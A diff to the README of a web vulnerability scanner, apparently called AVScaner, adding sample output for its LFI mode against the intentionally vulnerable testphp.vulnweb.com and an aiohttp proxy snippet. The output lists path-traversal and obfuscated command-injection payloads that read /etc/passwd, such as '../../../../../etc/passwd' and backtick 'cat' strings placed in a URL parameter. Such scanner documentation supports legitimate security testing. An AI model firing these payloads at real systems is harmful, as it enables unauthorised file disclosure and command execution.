@@ -72,6 +72,29 @@ python AVScaner_Link.py -c 20 -v -e -i "input_data/crawled_final.txt" -p "wordli
 ---
 
 ### LFI
+
+```bash
+python AVScaner_Link.py -c 20 -e -px http://127.0.0.1:8080
+
+[*] Starting @ 16:22:55 2024-08-30
+[*] Total number of payload variants per link: 36
+
+
+1/36 🐱  [+] URL: http://testphp.vulnweb.com/product.php?pic=text:/etc/passwd | Status: 200 
+2/36 🐭  [+] URL: http://testphp.vulnweb.com/product.php?pic=%7Bcat%2C/etc/passwd%7D | Status: 200 
+3/36 🐹  [+] URL: http://testphp.vulnweb.com/product.php?pic=view-source:file:///etc/passwd | Status: 200 
+4/36 🐰  [+] URL: http://testphp.vulnweb.com/product.php?pic=/%2A%2A%2A%2A/?at%24IFS/???/%2Aswd | Status: 200 
+27/36 🐻  [+] URL: http://testphp.vulnweb.com/product.php?pic=%7B%5Cc%27%27%5Ca%22%22%5Ct%2C/%5Ce%27%27%2A?/%5Cp%2A%5Cd%7D | Status: 200 
+28/36 🐨  [+] URL: http://testphp.vulnweb.com/product.php?pic=IFS=%2C%3B%60cat%3C%3C%3Ccat%2C/etc/passwd%60 | Status: 200 
+29/36 🐯  [+] URL: http://testphp.vulnweb.com/product.php?pic=../../../../../etc/passwd | Status: 200 
+30/36 🦁  [+] URL: http://testphp.vulnweb.com/product.php?pic=%7B%5Cc%27%27%5Ca%22%22t%2C/e%27%27%2A?/?a?s??%7D | Status: 200 
+
+
+[*] Finished @ 16:23:49 2024-08-30
+[*] Duration: 0:00:53.648854
+```
+
+
 ```bash
 python AVScaner_Link.py -c 20 -i "input_data/crawled_final.txt" -p "wordlist/payloads_LFI_70466.txt" -a "wordlist/answers_LFI.txt"
 
@@ -101,4 +124,22 @@ python AVScaner_Link.py -c 20 -v -e -i "input_data/crawled_final.txt" -p "wordli
 
 [*] Finished @ 00:28:22 2024-08-30
 [*] Duration: 0:00:00.765637
+```
+
+---
+
+## Proxy
+####  Windows Subsystem for Linux ([WSL](https://stackoverflow.com/questions/51887784/using-aiohttp-with-proxy/78727608#78727608))
+
+```text
+import aiohttp
+import ssl
+
+url = 'https://example.com'
+proxy_url = 'http://<user>:<pass>@<proxy>:<port>'
+path_to_cafile = '/etc/ssl/certs/ca-certificates.crt'
+ssl_ctx = ssl.create_default_context(cafile=path_to_cafile)
+
+async with aiohttp.ClientSession() as session:
+    async with session.get(url, proxy=proxy_url, ssl=ssl_ctx) 
 ```
